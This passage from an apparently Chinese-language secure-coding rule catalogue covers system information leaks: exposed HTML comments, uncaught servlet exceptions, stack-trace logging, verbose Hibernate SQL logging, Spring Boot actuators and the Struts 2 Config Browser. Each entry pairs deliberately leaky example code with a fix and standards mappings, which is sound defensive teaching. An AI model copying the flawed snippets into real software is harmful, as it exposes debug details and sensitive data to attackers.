<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- TBD: this needs a security audit --&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;recalcOrbit&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>甚至那些看上去并非恶意的注释也可能有利于某些人了解系统的构建形式。</p>
<h5 id="RECOMMENDATIONS-128"><a href="#RECOMMENDATIONS-128" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用 JSP 注释来代替 HTML 注释（JSP 注释不会传递给用户）。</p>
<p>例 2：前面的示例已重写为使用 JSP 注释，该注释不会显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%-- TBD: this needs a security audit --%&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;recalcOrbit&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-127"><a href="#REFERENCES-127" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 615</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[3] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[16] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Incomplete-Servlet-Error-Handling"><a href="#System-Information-Leak-Incomplete-Servlet-Error-Handling" class="headerlink" title="System Information Leak: Incomplete Servlet Error Handling"></a>System Information Leak: Incomplete Servlet Error Handling</h4><h5 id="ABSTRACT-129"><a href="#ABSTRACT-129" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果 Servlet 未捕获到所有异常，则可能会泄漏调试信息，从而有利于攻击者进行攻击。</p>
<h5 id="EXPLANATION-130"><a href="#EXPLANATION-130" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当 Servlet 抛出一个异常时，Servlet 容器回传给用户的默认错误响应通常会包含调试信息。这些信息对于攻击者来说是十分有用的。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。</p>
<p>例 1：在以下方法中，DNS 解析失败会导致 Servlet 抛出一个异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost (HttpServletRequest req,</span><br><span class="line"></span><br><span class="line">                    HttpServletResponse res)</span><br><span class="line"></span><br><span class="line">              throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String ip = req.getRemoteAddr();</span><br><span class="line"></span><br><span class="line">    InetAddress addr = InetAddress.getByName(ip);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    out.println(&quot;hello &quot; + addr.getHostName());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：如果“name”参数并未包含在请求中，那么以下方法会抛出一个 NullPointerException 异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost (HttpServletRequest req,</span><br><span class="line"></span><br><span class="line">                    HttpServletResponse res)</span><br><span class="line"></span><br><span class="line">              throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String name = getParameter(&quot;name&quot;);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    out.println(&quot;hello &quot; + name.trim());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-129"><a href="#RECOMMENDATIONS-129" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>所有顶级 Servlet 方法都应捕获 Throwable，从而尽可能降低调用 Servlet 错误响应机制的可能性。</p>
<p>例 3：例 1 中的代码可以按以下方式进行重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost (HttpServletRequest req,</span><br><span class="line"></span><br><span class="line">                    HttpServletResponse res) &#123;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line"></span><br><span class="line">          String ip = req.getRemoteAddr();</span><br><span class="line"></span><br><span class="line">          InetAddress addr = InetAddress.getByName(ip);</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">          out.println(&quot;hello &quot; + addr.getHostName());</span><br><span class="line"></span><br><span class="line">      &#125;catch (Throwable t) &#123;</span><br><span class="line"></span><br><span class="line">          logger.error(&quot;caught throwable at top level&quot;, t);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-128"><a href="#REFERENCES-128" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ernst Haselsteiner and Klemens Breitfuss Security in Near Field Communication (NFC): Strengths and Weaknesses</p>
<p>[2] ERR01-J. Do not allow exceptions to expose sensitive information CERT</p>
<p>[3] CONFIDENTIAL-1: Purge sensitive information from exceptions Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 209, CWE ID 431</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2)</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[12] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 209</p>
<p>[13] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 209</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Internal"><a href="#System-Information-Leak-Internal" class="headerlink" title="System Information Leak: Internal"></a>System Information Leak: Internal</h4><h5 id="ABSTRACT-130"><a href="#ABSTRACT-130" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-131"><a href="#EXPLANATION-131" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>通过打印或日志功能将系统数据或调试信息发送到本地文件、控制台或屏幕时，就会发生内部信息泄露。</p>
<p>例 1：以下代码针对标准的错误流输出了一个异常：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依据这一系统配置，该信息可转储到控制台，写成日志文件，或者显示给用户。在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。在上述例子中，泄露的信息可能会暗示操作系统的类型、系统上安装了哪些应用程序，以及管理员在配置应用程序时做了哪些方面的努力。</p>
<p>在移动世界，信息泄露也让人担忧。</p>
<p>例 2：以下代码记录在 Android 平台上捕获到的堆栈跟踪异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">    Log.e(TAG, Log.getStackTraceString(e));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-130"><a href="#RECOMMENDATIONS-130" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。此外，还要留意有关调试的跟踪信息，有时它可能出现在不明显的位置（例如嵌入在错误页 HTML 代码的注释行中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<h5 id="REFERENCES-129"><a href="#REFERENCES-129" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ernst Haselsteiner and Klemens Breitfuss Security in Near Field Communication (NFC): Strengths and Weaknesses</p>
<p>[2] ERR01-J. Do not allow exceptions to expose sensitive information CERT</p>
<p>[3] ENV02-J. Do not trust the values of environment variables CERT</p>
<p>[4] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[5] CONFIDENTIAL-1: Purge sensitive information from exceptions Oracle</p>
<p>[6] INPUT-1: Validate inputs Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Overly-Broad-SQL-Logging"><a href="#System-Information-Leak-Overly-Broad-SQL-Logging" class="headerlink" title="System Information Leak: Overly Broad SQL Logging"></a>System Information Leak: Overly Broad SQL Logging</h4><h5 id="ABSTRACT-131"><a href="#ABSTRACT-131" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>记录过多有关 SQL 查询的信息可能会泄露系统信息或危及用户隐私数据。</p>
<h5 id="EXPLANATION-132"><a href="#EXPLANATION-132" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL 查询不应记录在生产系统中。SQL 查询通常包含敏感信息，例如信用卡详细信息或社会保障号码。以明文形式记录这些信息可能会危及其保密性。</p>
<p>例 1： log4j.properties 文件中的以下条目将使所有查询都记录在 info 级别。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">log4j.logger.net.sf.hibernate.type=info</span><br><span class="line"></span><br><span class="line">log4j.logger.net.sf.hibernate.tool.hbm2ddl=info</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-131"><a href="#RECOMMENDATIONS-131" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应限制将 SQL 查询记录到 debug 级别，并注意不要让应用程序处于生产环境中的调试模式。</p>
<p>例 2：以下条目将使 Hibernate 查询记录在 debug 级别。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">log4j.logger.net.sf.hibernate.type=debug</span><br><span class="line"></span><br><span class="line">log4j.logger.net.sf.hibernate.tool.hbm2ddl=debug</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-130"><a href="#REFERENCES-130" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Red Hat Middleware, LLC Hibernate Reference Documentation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[3] Standards Mapping - FIPS200 AU</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.4</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.4, Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.4, Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.4, Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.4, Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.4, Requirement 6.5.5</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Spring-Boot-Actuators-Enabled"><a href="#System-Information-Leak-Spring-Boot-Actuators-Enabled" class="headerlink" title="System Information Leak: Spring Boot Actuators Enabled"></a>System Information Leak: Spring Boot Actuators Enabled</h4><h5 id="ABSTRACT-132"><a href="#ABSTRACT-132" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>启用 Spring Boot Actuator 可以揭示系统数据和调试信息，有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-133"><a href="#EXPLANATION-133" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Spring Boot Actuator 允许用户监控应用程序并与应用程序进行交互。多个不同的内置 Actuator 可以通过 HTTP 端点、JMX 或者甚至通过远程 Shell（SSH 或 Telnet）暴露系统数据和调试信息。攻击者可以利用此信息了解系统，并收集可用于攻击应用程序的信息。</p>
<h5 id="RECOMMENDATIONS-132"><a href="#RECOMMENDATIONS-132" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>配置 Acutator 时，始终要牢记安全性。如果 Actuator 揭示敏感数据，应将其标记为敏感，以便未经过身份验证的用户无法访问它。</p>
<p>示例：以下属性可用于将所有 Actuator 端点变成敏感端点：</p>
<p>endpoints.sensitive=true</p>
<p>在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。</p>
<h5 id="REFERENCES-131"><a href="#REFERENCES-131" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Spring Boot Reference Guide Spring</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Struts-2"><a href="#System-Information-Leak-Struts-2" class="headerlink" title="System Information Leak: Struts 2"></a>System Information Leak: Struts 2</h4><h5 id="ABSTRACT-133"><a href="#ABSTRACT-133" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-134"><a href="#EXPLANATION-134" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>在这种情况下，Struts 2 Config Browser 在 Maven pom.xml 文件中配置，因此它是可用的，并且与应用程序一起部署。</p>
<p>Config Browser 插件是一个调试工具，用来帮助在运行时查看应用程序的配置。调试与配置相关的问题时，该工具非常有用，但其暴露了过多详细信息，可能帮助攻击者映射应用程序和构建应用程序的模型。</p>
<h5 id="RECOMMENDATIONS-133"><a href="#RECOMMENDATIONS-133" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在生产环境中，不应该部署 Config Browser。</p>
<h5 id="REFERENCES-132"><a href="#REFERENCES-132" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Struts 2 Config Browser Plugin Apache Struts 2</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001312, CCI-001314, CCI-002420, CCI-003272 </p>
<p>[5] Standards Mapping - FIPS200 CM </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 8.3.4 Sensitive Private Data, 14.3.3 Unintended Security Disclosure Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.5 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.6 - Sensitive Data Retention </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
